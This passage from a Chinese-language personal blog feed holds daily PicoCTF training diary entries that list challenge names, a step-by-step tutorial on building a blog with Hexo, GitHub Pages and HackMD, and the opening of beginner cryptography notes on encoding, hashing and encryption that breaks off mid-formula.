        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>明天（2024.07.08）早上十點 SCIST 的季後賽就開始了，希望這次能打得比上次好！雖然這學期 SCIST 的課我有兩次沒去（工控安全），因為那時候正值期末周，我還是想說先顧自己轉系的分數&gt;&lt;。話雖如此，還是希望明天能好好發揮，越打越進步。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240707161049632.png" alt="SCIST季後賽通知信"></p><h1 id="今日進度">今日進度</h1><p>今天又刷了兩題 RSA，雖然好像這兩題都不是正規的 RSA 流程，但沒關係還是有稍微練習到 XD。</p><ol><li>b00tl3gRSA2</li><li>b00tl3gRSA3</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>10：10</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 08] Grinding PicoCTF 6</title>
      <link href="/posts/7c095067/"/>
      <url>/posts/7c095067/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天到第八天了，也算是正式踏入了將近整個計畫的四分之一。目前到現在覺得收穫還是挺多的，不管是新學到的技術或是之前很多沒有很扎實的基礎觀念，都有在這個計畫中被慢慢補足。</p><p>希望自己接下來的四分之三可以繼續努力！一些 Writeup 中如果有任何有錯誤的地方也都歡迎留言跟我說！</p><h1 id="今日進度">今日進度</h1><ol><li>Super Serial</li><li>rotation</li><li>miniRSA</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>9：00</code></li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐</li><li>精神狀態：⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 07] Grinding PicoCTF 5</title>
      <link href="/posts/a9158ef3/"/>
      <url>/posts/a9158ef3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>昨天斷更了一天，因為打算把中文站點和英文站點分開，所以對網站做了一些重構。</p><p>總之現在中文的站點在 <a href="https://cx330.tw">https://cx330.tw</a>；而英文的站點在 <a href="https://en.cx330.tw">https://en.cx330.tw</a>。是採用子域名的方式搭建的。大家可以兩邊都去玩玩看噢！雖然還有些文章還沒翻譯，但到時候英文站點應該就會是全英文了。</p><p>就醬。</p><h1 id="今日進度">今日進度</h1><p>由於上面所說的，這兩天花滿多時間在建站 + 重構，所以寫的題目比較少，如下。</p><ol><li>interencdec</li><li>Super Serial 寫一半，明天繼續</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>9：00</code></p></li><li><p>知識量：⭐⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 06] Grinding PicoCTF 4</title>
      <link href="/posts/41c83dfb/"/>
      <url>/posts/41c83dfb/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天九點多起來後吃了早餐，結果又跑回去睡覺睡到 13 點多，到底是個甚麼意思哦。為甚麼可以那麼累阿昨天明明也沒有很晚睡。每次晚起床都會有罪惡感，要被自己氣死。</p><h1 id="今日進度">今日進度</h1><p>今天寫了兩題，一題 Pwn，一題 Crypto。昨天的 Local Target 我已經請求外場學長的幫助了（因為它的 writeup 好少，看了也不太懂）。等學長伸出援手後我再回去補完更詳細的 Writeup。</p><ol><li>buffer overflow 0</li><li>Mini RSA</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>13：30</code>，不知道為甚麼今天超累。</li><li>知識量：⭐⭐⭐⭐</li><li>疲勞程度：⭐⭐⭐⭐⭐</li><li>精神狀態：⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 05] Grinding PicoCTF 3</title>
      <link href="/posts/a4b22abb/"/>
      <url>/posts/a4b22abb/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天還跑到台南去領租屋處的鑰匙和小搬家，下午才跑去星巴克開始今日的 CTF 訓練。</p><p>不得不說台南真的太熱了。🥲🥲🥲</p><h1 id="今日進度">今日進度</h1><p>Pwn 真的太難了，Local Target 我已經找到 flag 了只是還沒有很理解他的原理，先標記為做一半明天繼續。</p><ol><li>unminify</li><li>SQLiLite</li><li>GDB Test Drive</li><li>Local Target 做到一半</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>7：30</code></li><li>知識量：⭐⭐⭐⭐</li><li>疲勞程度：⭐⭐⭐⭐⭐</li><li>精神狀態：⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不懂就問！如何利用 Hexo + GitHub + HackMD 搭建自己的個人部落格</title>
      <link href="/posts/81070fa0/"/>
      <url>/posts/81070fa0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>從正在打這些字的今天開始算的話，距離網站架設起來的時間也有一個月了。</p><p>這段時間一直沒有好好的紀錄一下架站的過程，正好我身邊有一些朋友也想開始架自己的部落格，所以順便就來做個教學吧！</p><p>如同文章的標題，這次主要使用的就是 Hexo、GitHub、HackMD，那事不宜遲，我們就開始吧！</p><h1 id="Hexo-部署">Hexo 部署</h1><p>在開始前，我們先來介紹一下 Hexo 是甚麼吧！Hexo 是一個很快速也很輕量的靜態網頁框架（大部分用來架設 Blog），它可以讓使用者利用 Markdown 寫作，Hexo 會自己幫你生成靜態文件。</p><p>總之就是個很方便的框架，<strong>一天內一定可以讓你的網站順利上線</strong>！（加上一些環境問題還有其他的依賴問題，最少一個禮拜內也一定可以完成的）</p><h2 id="安裝-Hexo">安裝 Hexo</h2><p>在安裝前，有一些依賴環境需要先安裝，請先確保你的電腦上已經安裝了：</p><ul><li><a href="https://git-scm.com/">Git</a></li><li><a href="https://nodejs.org/en">Node.js</a>（官方推薦 Node.js 10.0 及其以上的版本）</li></ul><p>如果還沒安裝過，請先去安裝（網路上找有很多教學了，就先跳過）。確保有以上的軟體後，就可以安裝啦！Hexo 的安裝真的真的超級簡單（Mac 使用者可能會有環境問題，請看 <a href="https://hexo.io/zh-tw/docs/">官方說明文件</a>）。首先，請打開你的終端機（cmd、Powershell 等），並且輸入以下的命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安裝完成後，輸入<code>hexo -v</code>查看版本號，有正確顯示的話就說明安裝成功啦！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630164342694.png" alt="hexo -v"></p><h2 id="建立你的-Hexo-資料">建立你的 Hexo 資料</h2><p>安裝好 Hexo 的 CLI 工具後，就可以開始建立 Hexo 的資料夾了。<strong>注意，這個檔案夾就是你以後寫文章、放文章照片等等的地方了</strong>。首先，先移動到你想要放置這個檔案的路徑底下，並在這個路徑中打開終端，輸入以下的命令。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;資料夾名稱&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630165449041.png" alt="hexo init"></p><p>接下來，要進入這個資料夾中，安裝這個專案所需要的依賴包。請依序的輸入以下的命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;資料夾名稱&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630165915129.png" alt="image"></p><p>這樣就完成了初步的建立啦！建立完成後，專案資料夾下的檔案會像是以下這樣：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p>這些檔案都有其各自的用途，分別是：</p><p><strong>_config.yml</strong></p><ul><li>網站的配置檔案，可以設定如 URL、預設語言、站點名稱等。大部分的設置都會在這裡。</li></ul><p><strong>package.json</strong></p><ul><li>存放專案中所有需要用到的模組。</li></ul><p><strong>scaffolds</strong></p><ul><li><a href="https://hexo.io/zh-tw/docs/writing.html#%E9%B7%B9%E6%9E%B6%EF%BC%88Scaffold%EF%BC%89">鷹架</a> 的資料夾，裡面會放一些鷹架的架構。</li></ul><p><strong>source</strong></p><ul><li>這裡就是存放所有網頁內容的資料夾，包含文章、圖片等。以後寫文章也基本都是在這層目錄工作。</li></ul><p><strong>themes</strong></p><ul><li>主題的資料夾。</li></ul><p>到了這邊，你已經大致架完了 Hexo 的環境，那接下來看看怎麼部署到 GitHub 吧。</p><h2 id="Hexo-指令">Hexo 指令</h2><p>之後寫文章一定會用到的，就是 Hexo 的指令了。我會簡單介紹幾個，想要了解更詳細請見 <a href="https://hexo.io/zh-tw/docs/commands">官方文件</a>。</p><h3 id="創建新文章">創建新文章</h3><p>以下的角括號請替換為你自己的文章標題。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;&lt;文章標題&gt;&quot;</span><br></pre></td></tr></table></figure><p>這個指令會生成一份<strong>markdown</strong>文件到<code>_post</code>資料夾中。</p><h3 id="本地預覽">本地預覽</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>或是也可以簡寫為</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>這個指令會在 localhost 上面啟動伺服器，讓你先預覽網站。</p><h3 id="部署">部署</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>也可以簡寫為</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>它會自動把你的<strong>source</strong>資料夾中的內容生成為靜態檔案，並且部署到你所設定的 GitHub Repo。（後面會詳細介紹實作方式）</p><h3 id="刪除靜態檔案">刪除靜態檔案</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p>這個指令會幫你把你使用<code>hexo generate</code>或是<code>hexo deploy</code>所產生的靜態檔案刪除。</p><h1 id="連結-GitHub-Repo">連結 GitHub Repo</h1><h2 id="創建-Repo">創建 Repo</h2><p>首先，你要先建立一個 GitHub Repo，用來存放網站的靜態資料。同時，這個 GitHub Repo 也會成為到時候部署的地方（當然你也可以用其他的靜態網站託管服務，但這是免費的！）。</p><p>建立 Repo 的時候，請遵循以下幾個要點：</p><ol><li>Repo 名稱設定為<strong>USERNAME.github.io</strong>，<strong>USERNAME</strong>記得改為你自己的使用者名稱。</li><li>Repo 請設定為<strong>公開</strong></li></ol><p>完成後，我們就來把這個 Repo（以下簡稱為 GitHub Repo）連結到你的 Hexo 專案吧！開始前你需要先安裝一個部署的外掛。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>打開你的 Hexo 專案中的<code>_config.yml</code>，並加入以下的設定：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">&lt;你的</span> <span class="string">Repo</span> <span class="string">URL&gt;</span> <span class="comment"># https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><h2 id="建立-GitHub-Pages">建立 GitHub Pages</h2><p>進到你的 GitHub Repo 中，點選 Settings。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173247120.png" alt="GitHub Repo Settings"></p><p>在側邊點選 Pages。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173423864.png" alt="GitHub Pages"></p><p>把<code>Branch</code>切換到<code>Main</code>，並且按下<code>Save</code>。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173802148.png" alt="Set branch to main"></p><p>完成後，等待個大約一到兩分鐘，上面就會顯示出你的網站部署好的 URL 啦！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173922108.png" alt="Finish!"></p><p>因為我有購買域名，所以可以設定 Custom Domain。如果你也有購買域名，並且想設置它作為你的部落格 URL，請見 <a href="https://clairechang.tw/2023/06/28/web/github-pages-with-custom-domain/">GitHub Pages 自訂域名與 HTTPS 設定（GoDaddy + Cloudflare）</a>。</p><h2 id="修改-Hexo-配置文件">修改 Hexo 配置文件</h2><p>創建好 Repo 後，你需要打開 Hexo 專案資料夾裡面的的<code>_config.yml</code>文件（<strong>注意，這邊是指 Hexo 配置文件，並不是主題配置文件</strong>），新增以下內容。（詳見 <a href="https://hexo.io/zh-tw/docs/one-command-deployment">官方文檔</a>）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">你的專案連結</span> <span class="comment">#舉例：https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span></span><br><span class="line">    <span class="attr">branch:</span> [<span class="string">branch</span>] <span class="comment"># 通常為main</span></span><br></pre></td></tr></table></figure><p>修改完後，還需要去安裝一個套件。這個套件可以幫助你自動部署你使用<code>hexo d</code>時產生的靜態文件到你設定的 Repo。安裝方式如下：</p><ol><li>打開你的 Hexo 專案資料夾（有<code>package.json</code>的那個資料夾）。</li><li>在這層目錄中打開終端。</li><li>輸入<code>npm install hexo-deployer-git --save</code>。</li><li>大功告成。</li></ol><p>如果你有使用 Vscode 的 GitHub 擴充套件儲存過使用者 token，就可以直接用<code>hexo d</code>部署你的文章啦！如果沒有的話也沒關係，只需要在<code>hexo d</code>的時候提供使用者名稱和密碼就行了。</p><p>到這邊，你就已經大致完成啦！接下來只要找個喜歡的 <a href="https://hexo.io/themes/">Hexo 主題</a>、<a href="https://hexo.io/zh-tw/docs/configuration">設定配置文件</a>，就可以開始寫作囉！（這邊可以去看看官方文件，選個自己喜歡的主題，並照著文檔配置就行了）</p><h2 id="部署到網站上">部署到網站上</h2><p>GitHub Pages 有個很方便的功能，就是當你每次有新的 Commit 的時候，它都會自動幫你更新你的網頁的內容。所以以後更新文章後，只需要使用<code>hexo deploy</code>把更新的內容提交到 GitHub 倉庫，它就會自動幫你更新網頁啦！</p><h1 id="開始寫作啦！">開始寫作啦！</h1><p>我自己目前的寫作方式，是使用 <a href="https://hackmd.io/">HackMD</a> 來寫作的，因為它有許多優點。</p><ol><li><strong>免費的圖床</strong><ul><li>不只免費，操作也只要複製圖片並貼上，就能自動生成圖片 URL，讓寫作更輕鬆。</li></ul></li><li><strong>迅速且輕便</strong><ul><li>以網頁為主的 HackMD，讓你只需要一個瀏覽器就可以快速打開筆記，並開始寫作。</li></ul></li><li><strong>對 Markdown 語法的支援</strong><ul><li>支援 MathJax、Mermaid 等 Markdown 擴充語法，讓寫作可以更靈活。</li></ul></li></ol><p>至於我寫作的方式，步驟如下：</p><ul><li>用<code>hexo new &lt;文章標題&gt;</code>先建立一篇文章在 Post 資料夾。（目的是可以生成文章創建的時間，以及文章的 <a href="https://hexo.io/zh-tw/docs/front-matter">Front Matter</a>）</li><li>複製貼上（包含 Front Matter）到 HackMD 編輯。</li><li>編輯完後，再複製回原本的檔案。</li><li>用<code>hexo deploy</code>部署。</li></ul><p>這樣就完成了一次的寫作啦！畢竟寫文章一定會多多少少有圖片，使用 HackMD 就可以不用擔心圖片問題，可以很方便也很迅速地完成寫作歐！</p><h1 id="後記">後記</h1><p>我覺得用這套方法<strong>便宜</strong>、<strong>方便</strong>、<strong>快速</strong>，不僅可以提升你寫作的意願，也可以讓你在一開始比較有成就感，增強你寫作的動力！真的是很不錯的方式～</p><p>我自己建立部落格所需要的花費就只有</p><ul><li>$1468 買了兩年的域名</li><li><s>花了很多的時間踩坑</s>（但是不是 Hexo 的問題，是我的主題依賴的問題）</li><li><s>年輕的肝</s></li></ul><p>總之，就是非常喜歡自己現在的成果啦！也希望你們可以搭建成功，同時也可以加入寫作的行列歐！</p><p>如果這篇文章對你有幫助，歡迎 <a href="https://cx330.tw/subscribe">訂閱我的部落格</a>，同時也非常歡迎大家在底下留言或按表情和我互動，如果我有哪裡說錯，也歡迎討論！</p>]]></content>
      
      
      <categories>
          
          <category> DevCorner </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> 網頁開發 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 04] Grinding PicoCTF 2</title>
      <link href="/posts/4c6f99b3/"/>
      <url>/posts/4c6f99b3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>家人們家人們！有鑑於昨日收到的兩個消息，第一是 7/10 到 7/12 有 SCIST 資安課的 CTF 季後賽要打，第二是我錄取了 AIS3 暑期資安課程的備取，所以我決定先來好好地刷些題目。所以<a href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">這個密碼學任督二脈</a>我就先緩緩，之後比賽結束了再將它給補上！！！</p><h1 id="今日進度">今日進度</h1><p>今天下午寫了三題，Misc, Crypto, Forensics 各寫了一題，還算學到滿多新知識的！真的是越學越有趣了，我愛學習！學習使我快樂！深深的體會了知識所能帶給我的愉悅，是更深層次的快樂。</p><ol><li>binhexa</li><li>Custom encryption</li><li>MSB</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>9:30</code>，假日睡晚一點 XD</li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐</li><li>精神狀態：⭐⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicoCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 03] Learning Cryptography 2</title>
      <link href="/posts/f9245dd2/"/>
      <url>/posts/f9245dd2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>這是第一個 TechStreak30 系列的第三天，今天一樣繼續 work on <a href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">我的密碼學筆記</a>，歡迎大家來看！一想到之後要進入 RSA 的部分就感覺好難 XD，但總之就加油啦！</p><h1 id="今日進度">今日進度</h1><p>今天寫完了 Hash 的部分，也有寫了一半的古典密碼學。進度還行，還不錯，明天繼續努力囉！</p><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>9:30</code></li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐⭐</li><li>精神狀態：⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 02] Learning Cryptography</title>
      <link href="/posts/b40c06ed/"/>
      <url>/posts/b40c06ed/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>密碼學一直以來都是我覺得超級超級困難的東西，為了可以更好的搞清楚它，決定寫一篇筆記來給自己（和各位）當作學習的資料！我把連結放在<a href="/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88">這個地方</a>，大家想看可以直接點過去噢！</p><h1 id="今日進度">今日進度</h1><p>今天只寫完了前言以及編碼的部分。然後因為編碼的部分還算簡單，就是還沒有那麼多的數學，所以今天的知識量負擔滿輕的，不過明後天進入到數學部分（甚麼費馬小定理有的沒的）就會變超難了 XD。希望明天可以把古典密碼學那邊讀完，再來就進入對稱和非對稱加密啦！</p><h1 id="今日狀態">今日狀態</h1><ul><li>起床時間：<code>8:30</code>但是滑手機到<code>9:05</code>才下床</li><li>知識量：⭐</li><li>疲勞程度：⭐⭐⭐</li><li>精神狀態：⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> CyberSec </tag>
            
            <tag> TechStreak30 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cryptography for Muggles 密碼學任督二脈</title>
      <link href="/posts/39694de9/"/>
      <url>/posts/39694de9/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><h2 id="為甚麼會想寫這篇文">為甚麼會想寫這篇文</h2><p>因為自己在學習的時候一直覺得密碼學是個很困難的領域，所以決定自己把一些筆記給記錄下來。一來是幫助自己以後可以回來翻，其次也希望可以幫助到正在學習密碼學的人！加油啦！</p><h2 id="柯克霍夫原則-Kerckhoffs’s-principle">柯克霍夫原則 Kerckhoffs’s principle</h2><blockquote><p>“A cryptosystem should remain secure even if an adversary knows all the details of the system, except for the secret decryption key.” — <strong><em>Kerckhoffs’s principle</em></strong></p></blockquote><p>柯克霍夫原則是由 Auguste Kerckhoffs 在 19 世紀提出的，其內容主要就是說明一個好的加密系統即使其運作原理全部都是公開的，只要金鑰未公開，他就應該要是安全的。資訊理論的創始人 Claude Shannon 將其改說為以下說法。</p><blockquote><p>“The enemy knows the system” — <strong><em>Claude Shannon</em></strong></p></blockquote><p>也就是說，永遠預設敵人知道你的整個加密系統是如何運作的，包括其中的算法以及各種原理。一個加密系統要在這樣的情境下還能保證其加密資料的安全性才稱得上是安全的。</p><h2 id="領域展開：密碼學的三大領域">領域展開：密碼學的三大領域</h2><p>在密碼學中的任何知識幾乎都是圍繞著<strong>編碼</strong>、<strong>雜湊</strong>、<strong>加密</strong>這三個領域，所以就先來分別簡單聊聊他們各自都是甚麼吧！（這裡推薦一篇文章，講的滿深入淺出的：<a href="https://medium.com/starbugs/what-are-encoding-encrypt-and-hashing-4b03d40e7b0c">一次搞懂密碼學中的三兄弟 — Encode、Encrypt 跟 Hash</a>）</p><h3 id="編碼-Encoding">編碼 Encoding</h3><p>編碼的目的是為了資料的傳輸或表達，把原本的資料<strong>換一種方式</strong>表達而已。因為他只是把資料轉換成另一種形式，所以編碼後的資料仍然可以被解碼（Decode），也就是說整個過程完全是<strong>可逆的</strong>。</p><p>所以這裡要特別注意。<strong>編碼不是加密！編碼不是加密！編碼不是加密！</strong></p><h3 id="雜湊-Hashing">雜湊 Hashing</h3><p>雜湊，又名哈希（對就是直接從 Hash 直接翻過來）。雜湊的話主要是用於數據校驗以及數據完整性的驗證，還有一些其他的安全應用比如數位簽章等。雜湊算法會有以下的特性：</p><ol><li><strong>不可逆性</strong>：雜湊的算法是不可逆的，無法透過已知的雜湊值（哈希值 Hash values）回推原始資料。</li><li><strong>固定長度輸出</strong>：不管輸入的數據長度為何，哈希函式都會生成固定長度的哈希值。比如 SHA-256 的輸出長度就是固定 256 個 Bits。</li><li><strong>唯一性</strong>：理想情況下，兩個不同的輸入會產生不同的輸出（避免碰撞）。</li></ol><h3 id="加密-Encryption">加密 Encryption</h3><p>加密就相對好理解啦！就是用於保護數據的機密性（Confidentiality），確保只有被授權的用戶才能訪問數據。其加密和解密的過程都<strong>依賴於密鑰</strong>（Key），密鑰的保密性也會直接的影響到數據的安全性。</p><p>就好比是一個保險箱，要打開它需要一把鑰匙，而那把鑰匙就是密鑰。如果密鑰被盜取，那麼保險箱也就毫無用處了。</p><h1 id="常見編碼-Common-Encoding">常見編碼 Common Encoding</h1><h2 id="ASCII-Encoding">ASCII Encoding</h2><h3 id="簡介">簡介</h3><p>這應該大家都很熟悉吧！他的全名是 American Standard Code for Information Interchange，反正不是很重要，就是一個挺常見的編碼方式。以下是一張 ASCII 表：</p><p><img src="https://hackmd.io/_uploads/rJ6NTsq8A.png" alt="ASCII Table from GeeksforGeeks"></p><h3 id="Python-Code">Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 將字符串轉換為 ASCII 編碼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> input_string]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將 ASCII 編碼轉換回字串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_decode</span>(<span class="params">ascii_codes</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(code) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_codes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">input_string = <span class="string">&quot;This is ASCII encoding&quot;</span></span><br><span class="line">ascii_encoded = ascii_encode(input_string)</span><br><span class="line">ascii_decoded = ascii_decode(ascii_encoded)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original string:&quot;</span>, input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ASCII encoded:&quot;</span>, ascii_encoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ASCII decoded:&quot;</span>, ascii_decoded)</span><br></pre></td></tr></table></figure><h2 id="Base64-Encoding">Base64 Encoding</h2><h3 id="簡介-2">簡介</h3><p>Base64 通常用於傳輸二進制數據的場合，例如在電子郵件中嵌入圖像、文件等。它的範圍是從使用<code>A-Z</code>、<code>a-z</code>、<code>0-9</code>，共 62 個字符，加上兩個額外字符<code>+</code>和<code>/</code>，共 64 個字符。</p><h3 id="原理">原理</h3><p>Base64 編碼這個名稱代表著它<strong>基於 64 個可列印字元</strong>所形成的編碼。由於 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mn>64</mn><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">\log_{2}64=6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9386em;vertical-align:-0.2441em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span 